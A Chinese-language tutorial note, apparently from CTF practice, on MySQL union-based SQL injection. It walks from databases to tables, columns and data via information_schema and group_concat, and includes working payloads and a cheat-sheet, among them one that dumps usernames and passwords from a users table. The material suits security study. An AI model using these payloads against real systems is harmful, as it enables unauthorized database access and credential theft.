## 一句话概括

拿到一个能用的注入点后，取数永远按同一个顺序走：**查库 → 查表 → 查列 → 查数据**。中间全靠 MySQL 自带的 `information_schema` 系统库导航。

## 原理

### 1. 为什么要用 information_schema

我们不知道目标库里有什么表、表里有什么列。`information_schema` 就是 MySQL 的「元数据总目录」，它把「这个实例有哪些库、每个库有哪些表、每张表有哪些列」都当成普通数据存了起来，可以直接 `SELECT` 出来：

| 系统表 | 存的内容 | 关键列 |
|---|---|---|
| `information_schema.schemata` | 所有数据库 | `schema_name` |
| `information_schema.tables` | 所有表 | `table_schema`、`table_name` |
| `information_schema.columns` | 所有列 | `table_schema`、`table_name`、`column_name` |

### 2. 为什么要 group_concat

页面通常 `limit 1`，一次只显示一行。`group_concat()` 把多行合成一行（默认用逗号连接），一次请求就能把整张表的表名/列名全部带出来。

### 3. 为什么要先数清列数

`UNION` 要求前后列数一致，所以信息收集之前必须先用 `order by` 或 `group by` 拿到列数。

## 四步通用流程

```sql
-- 1. 查当前库名
union select 1,database()

-- 2. 查所有数据库
union select 1,group_concat(schema_name) from information_schema.schemata

-- 3. 查当前库的所有表
union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
-- 查其他库的表就直接替换 database()：where table_schema='ctfshow_web'

-- 4. 查指定表的所有列
union select 1,group_concat(column_name) from information_schema.columns where table_name='表名'

-- 5. 查数据
union select 列1,列2 from 表名
```

配合上下文，实际发出去的完整 payload 形如：

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'--+
-1' union select 1,group_concat(username,0x3a,password) from users--+
```

## 查询与函数速查

### 基础查询组件

| 类别 | 关键词/函数 | 说明 |
|---|---|---|
| 基础查询 | `SELECT` | 指定要查询的列 |
| | `FROM` | 指定要查询的表 |
| | `WHERE` | 指定查询条件 |
| 参数指令 | `UNION` | 合并多个 SELECT 的结果集 |
| | `GROUP BY` | 按指定列对结果分组 |
| | `ORDER BY` | 按指定列排序 |
| | `LIMIT` | 限制返回的记录数量 |
| | `AND` | 逻辑与，多个条件同时满足 |
| | `OR` | 逻辑或，满足其一即可 |
| 常用函数 | `GROUP_CONCAT()` | 把分组中的多个值连成一个字符串 |
| | `DATABASE()` | 返回当前数据库名称 |
| | `VERSION()` | 返回 MySQL 服务器版本 |

### 条件查询与子查询

```sql
-- 基础查询
SELECT * FROM users WHERE id=1;

-- IN 条件
SELECT * FROM users WHERE id IN ('3');   -- 查询 id=3 的记录

-- 子查询（括号内优先计算）
SELECT * FROM users WHERE id=(SELECT id FROM users WHERE username='admin');
```

## UNION：列数必须一致

```sql
-- 报错：union 前后表的列数不同
SELECT * FROM users WHERE id=6 UNION SELECT * FROM emails WHERE id=6;

-- 修正：用固定值补齐列数
SELECT * FROM users WHERE id=6 UNION SELECT *,3 FROM emails WHERE id=6;
```

分析：假设 `users` 有 4 列（`id,name,email,age`），`emails` 有 3 列（`id,email_address,user_id`），那么 `SELECT *,3` 就是 `id,email_address,user_id,3`，正好 4 列，多出来的第三列填了一个固定值 `3`。这就是注入里 `union select 1,2,3,...` 写一串数字的由来——**数字只是用来占位的**，写什么都行，最后用来判断哪个位置能回显。

## GROUP BY：另一种判断列数的方式

```sql
SELECT department, COUNT(id) FROM student GROUP BY department;
SELECT username FROM user GROUP BY username;   -- 把同名的人归到一组
```

判断列数：

```sql
SELECT * FROM users WHERE id=1 GROUP BY 2;
SELECT * FROM users WHERE id=1 GROUP BY 4;
```

原理：

```sql
SELECT username FROM users GROUP BY 2;
-- error：username 只有一列，不存在第二列可分组 → 报错
```

## ORDER BY / LIMIT / AND / OR

```sql
-- order by：按第 2 列升序排列
select * from user order by 2;
-- 降序
select * from user order by 2 desc;

-- limit：从第 1 行开始显示 3 行
select * from user limit 0,3;

-- and：两个条件都满足才输出
select * from user where id=1 and username='QIU';
-- or：满足一个就出现在输出行
select * from user where id=1 or username='QIU';
```

## 常用函数

```sql
-- 把多行压成一行输出（防御「只显示第一行」）
select GROUP_CONCAT(id,username,salary) from user;

-- 查数据库名
select database();

-- 查数据库版本
select version();
```

## Payload 速查

| 目的 | Payload |
|---|---|
| 当前库 / 用户 / 版本 | `union select 1,database(),user()` |
| 库版本 | `union select 1,version(),@@version_compile_os` |
| 所有库 | `union select 1,group_concat(schema_name) from information_schema.schemata` |
| 当前库的表 | `union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()` |
| 指定库的表 | `... where table_schema='库名'` |
| 指定表的列 | `union select 1,group_concat(column_name) from information_schema.columns where table_name='表名'` |
| 取数据 | `union select 列1,列2 from 表名` |
| 拼接多字段 | `union select 1,group_concat(username,0x3a,password) from users` |

## 踩坑与备注

- **`table_schema=database()` 只查当前库**；要翻别的库必须显式写库名，如 `where table_schema='ctfshow_web'`。
- **`information_schema` 是通用的**：`schemata`、`tables`、`columns` 在 MySQL 各版本都存在，这套四步流程在绝大多数 MySQL 环境都适用。
- **`group_concat` 有长度上限**（默认受 `group_concat_max_len` 限制），数据特别多时可能被截断；此时可以配合 `limit` 分页或改用逐字符盲注。
- **列名/表名要用引号包起来**：`where table_name='users'`，漏了引号会把 `users` 当列名解析，直接报 `Unknown column`。
